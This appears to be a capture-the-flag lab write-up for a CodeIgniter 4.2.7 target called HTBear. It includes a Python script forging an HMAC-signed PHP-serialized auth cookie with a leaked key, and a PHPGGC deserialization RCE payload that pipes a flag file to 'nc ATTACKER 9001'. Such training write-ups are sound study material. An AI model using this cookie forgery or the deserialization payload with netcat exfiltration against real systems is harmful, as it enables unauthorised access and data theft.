# Skills Assessment II — HTBear (Black-Box, CodeIgniter 4.2.7)

## Recon

- PHP 7.4.32, CodeIgniter 4.2.7 (footer)
- `auth` cookie = `base64(php_serialized_array).sha1_hmac`
- Serialized data: `a:3:{s:2:"id";...;s:4:"role";s:1:"1";}`
- **HMAC key leaked in HTML comment**: `<!-- For debugging purposes: @pp_s3cret!! -->`

## Part 1 — Admin Access

HMAC is `hmac_sha1(key, raw_serialized_bytes)` (NOT over the base64 string).

Forge cookie with role=`0` on our own user:
```python
import hmac, hashlib, base64

SECRET = b"@pp_s3cret!!"
raw = b'a:3:{s:2:"id";s:1:"5";s:8:"username";s:14:"<our_user>";s:4:"role";s:1:"0";}'
b64 = base64.b64encode(raw).decode()
sig = hmac.new(SECRET, raw, hashlib.sha1).hexdigest()
print(f"{b64}.{sig}")
```

Submit as `auth` cookie → admin panel unlocks with flag.

## Part 2 — RCE via /import (PHP Deserialization)

Admin panel has `/export/{id}` (returns base64-encoded PHP serialized post) and `/import` (deserializes it). Import calls `unserialize()` on the POST `data` field.

Use PHPGGC `CodeIgniter4/RCE2` (`__destruct` vector, covers 4.0.0-rc.4 <= 4.3.6):

```bash
phpggc CodeIgniter4/RCE2 system 'cat /var/www/htbear/flag.txt | nc ATTACKER 9001' -b
```

POST the base64 payload to `/import`. Flag is at `/var/www/htbear/flag.txt` (found via `find / -maxdepth 5 -name flag.txt`).

## Key Notes

- HMAC is computed over **raw bytes**, not the base64-encoded string — test both inputs when cracking signing schemes
- `__destruct` vector fires during PHP garbage collection, **after** the HTTP response is sent — curl times out (exit 28) but the nc receives the flag ~10–15 seconds later; wait long enough
- Key discovery: always check HTML comments (`<!-- ... -->`) for debug artifacts
- Flag path: `/var/www/htbear/flag.txt` (not working directory)
